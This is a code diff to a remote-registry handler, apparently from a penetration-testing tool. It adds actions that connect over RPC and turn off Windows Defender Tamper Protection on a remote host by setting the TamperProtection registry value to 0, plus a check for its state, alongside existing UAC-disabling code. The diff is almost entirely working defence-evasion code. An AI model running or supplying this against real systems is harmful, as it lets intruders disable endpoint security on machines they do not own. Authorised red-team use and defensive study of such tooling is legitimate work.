@@ -168,6 +168,10 @@ class RegHandler:
                 self.enableUAC(dce)
             elif self.__action == 'CHECKUAC':
                 self.checkUAC(dce)
+            elif self.__action == 'DISABLETAMPER':
+                self.disableTamper(dce)
+            elif self.__action == 'CHECKTAMPER':
+                self.checkTamper(dce)
             else:
                 logging.error('Method %s not implemented yet!' % self.__action)
 
@@ -301,7 +305,7 @@ class RegHandler:
 
 
     def enableUAC(self, dce):
-        # 
+        # this actually disables UAC but the key is enable.... 
         try:
             ans = rrp.hOpenLocalMachine(dce)
             regHandle  = ans['phKey']
@@ -446,3 +450,56 @@ class RegHandler:
             # RID 500 local administrator using either plaintext credentials or password hashes
 
 
+    def disableTamper(self, dce):
+        # 
+        try:
+            ans = rrp.hOpenLocalMachine(dce) # gets handle for HKEY_LOCAL_MACHINE
+            regHandle  = ans['phKey']
+        except Exception as e:
+            logging.debug('Exception thrown when hOpenLocalMachine: %s', str(e))
+            return
+
+        try:
+            resp = rrp.hBaseRegCreateKey(dce, regHandle , 'SOFTWARE\\Microsoft\\Windows Defender\\Features')
+            keyHandle = resp['phkResult']
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegCreateKey: %s', str(e))
+            return
+
+        # TamperProtection
+        try:
+            resp = rrp.hBaseRegSetValue(dce, keyHandle, 'TamperProtection\x00',  rrp.REG_DWORD, 0)
+            self.logger.highlight('TamperProtection Key Set! TamperProtection is now off!')
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegSetValue EnableLUA: %s', str(e))
+            self.logger.error('Could not set TamperProtection Key')
+            pass
+
+    def checkTamper(self, dce):
+        # 
+        try:
+            ans = rrp.hOpenLocalMachine(dce) # gets handle for HKEY_LOCAL_MACHINE
+            regHandle  = ans['phKey']
+        except Exception as e:
+            logging.debug('Exception thrown when hOpenLocalMachine: %s', str(e))
+            return
+
+        try:
+            resp = rrp.hBaseRegCreateKey(dce, regHandle , 'SOFTWARE\\Microsoft\\Windows Defender\\Features')
+            keyHandle = resp['phkResult']
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegCreateKey: %s', str(e))
+            return
+
+        # TamperProtection
+        try:
+            dataType, tp_value = rrp.hBaseRegQueryValue(dce, keyHandle, 'TamperProtection')
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegQueryValue: %s', str(e))
+            tp_value = 5
+            pass
+
+        if tp_value == 5:
+            self.logger.highlight('TamperProtection = 5  (its on)   ')
+        else:
+            self.logger.highlight('TamperProtection = {}  (less than 5 is good)'.format(tp_value))
